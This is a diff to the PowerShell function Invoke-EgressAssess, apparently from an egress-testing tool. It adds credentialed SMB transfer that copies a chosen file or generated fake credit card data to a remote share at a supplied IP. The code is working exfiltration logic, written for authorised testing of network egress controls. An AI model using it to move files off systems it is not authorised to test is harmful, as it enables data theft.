@@ -2219,6 +2219,12 @@ function Invoke-EgressAssess
         
         function Use-SMB
         {
+            if($username -and $password)
+            {
+                $pass = ConvertTo-SecureString $password -AsPlainText -Force
+                $mycreds = New-Object System.Management.Automation.PSCredential($Username, $pass)
+                
+            }
             if ($Datatype -eq "cc")
             {
                 Generate-CreditCards
@@ -2246,7 +2252,18 @@ function Invoke-EgressAssess
                 Write-Verbose "[*] Sending file to egress server.."
                 try
                 {
-                    Copy-Item -Path $Datatype -Destination \\$IP\data
+                    $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
+                    $FileName = get-childitem $Datatype | % { $_.Name }
+                    if ($pass)
+                    {
+                        New-PSDrive -Name T -PSProvider FileSystem -Root \\$IP\data -Credential $mycreds
+                        Copy-Item -Path $SourceFilePath -Destination "T:\$FileName"
+                        Remove-PSDrive -Name T 
+                    }
+                    else
+                    {
+                        Copy-Item -Path $Datatype -Destination \\$IP\data
+                    }
                     Write-Verbose "[*] File transfer complete."
                     Break
                 }
@@ -2267,8 +2284,16 @@ function Invoke-EgressAssess
                     $Date = Get-Date -Format Mdyyyy_hhmmss
                     $Path = "smbdata_" + $Date + ".txt"
                     $SMBData | Out-File "$env:temp\$Path"
-                    Copy-Item -Path $env:temp\$Path -Destination \\$IP\data
-                    
+                    if ($pass)
+                    {
+                        New-PSDrive -Name T -PSProvider FileSystem -Root \\$IP\data -Credential $mycreds
+                        Copy-Item -Path $env:temp\$Path -Destination "T:\"
+                        Remove-PSDrive -Name T 
+                    }
+                    else
+                    {
+                        Copy-Item -Path $env:temp\$Path -Destination \\$IP\data
+                    }
                     try
                     {
                         Remove-Item -Path $env:temp\$Path
